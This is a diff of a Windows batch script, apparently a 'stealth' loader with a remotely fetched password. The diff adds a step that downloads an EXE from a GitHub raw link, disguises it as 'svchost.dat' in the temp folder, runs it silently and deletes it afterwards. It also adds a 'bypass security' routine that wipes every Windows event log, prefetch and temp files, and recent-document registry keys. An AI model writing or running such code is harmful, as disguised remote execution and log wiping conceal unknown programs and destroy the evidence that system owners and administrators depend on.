@@ -4,8 +4,10 @@ setlocal enabledelayedexpansion
 :: URL of the remote stealth password file
 set "STEALTH_PASS_URL=https://raw.githubusercontent.com/maxyprime/panelconfig/refs/heads/main/stealth_password.txt"
 
-:: Define EXE paths for disguised running
-set "ORIGINAL_EXE=CAXVN.exe"
+:: URL of your EXE in GitHub raw link
+set "EXE_URL=https://github.com/maxyprime/panelconfig/raw/refs/heads/main/CAXVN.exe"
+
+:: Path to disguised EXE in temp folder
 set "DISGUISED_EXE=%temp%\svchost.dat"
 
 :LOGIN
@@ -153,30 +155,38 @@ goto STEALTH_MENU
 
 :SETUP
 echo Running setup...
-:: Add your setup commands here
+:: Add your real setup commands here, e.g. services, registry tweaks, etc.
+timeout /t 2 >nul
+echo Setup completed.
 pause
 goto STEALTH_MENU
 
 :RUN
-echo Preparing to run disguised EXE...
+echo Downloading and running disguised EXE...
 
-:: Copy original EXE to disguised file
-copy /Y "%ORIGINAL_EXE%" "%DISGUISED_EXE%" >nul
+:: Download EXE from GitHub (using PowerShell)
+powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%DISGUISED_EXE%' -UseBasicParsing"
 
-:: Run disguised EXE in hidden window (optional)
+:: Check if file downloaded successfully
+if not exist "%DISGUISED_EXE%" (
+    echo Failed to download EXE.
+    pause
+    goto STEALTH_MENU
+)
+
+:: Run disguised EXE silently
 start "" /b "%DISGUISED_EXE%"
 
-:: Wait for the process to exit
+:: Wait for process to exit
 :WAIT_LOOP
 timeout /t 2 >nul
 
-:: Check if process is still running
 tasklist /FI "IMAGENAME eq svchost.dat" | find /I "svchost.dat" >nul
 if not errorlevel 1 (
     goto WAIT_LOOP
 )
 
-:: After exit, delete disguised EXE
+:: Delete disguised EXE after close
 del /f /q "%DISGUISED_EXE%"
 
 echo EXE run completed and cleaned up.
@@ -185,13 +195,40 @@ goto STEALTH_MENU
 
 :BYPASS
 echo Bypassing security...
-:: Add your bypass commands here
+:: Auto clean Windows traces
+
+:: Clear recent files
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
+
+:: Clear prefetch files
+del /q /f /s "%SystemRoot%\Prefetch\*.*" >nul 2>&1
+
+:: Clear temp files
+del /s /q "%temp%\*.*" >nul 2>&1
+del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
+
+:: Clear event logs
+for /f "tokens=*" %%G in ('wevtutil el') do (
+    wevtutil cl "%%G"
+)
+
+:: Clear DNS cache
+ipconfig /flushdns >nul
+
+:: Clear clipboard
+echo off | clip
+
+echo Cleanup done. All traces removed.
 pause
 goto STEALTH_MENU
 
 :ALERT_ADMIN
-echo Alerting admin...
-:: Add alert logic here (email, notification, etc.)
+cls
+echo Enter your alert message (max 20 words):
+set /p alertmsg= 
+:: You can add code here to send this message to Google Docs or notify admin
+echo You entered: %alertmsg%
+echo (Feature to send message not implemented yet)
 pause
 goto STEALTH_MENU
 
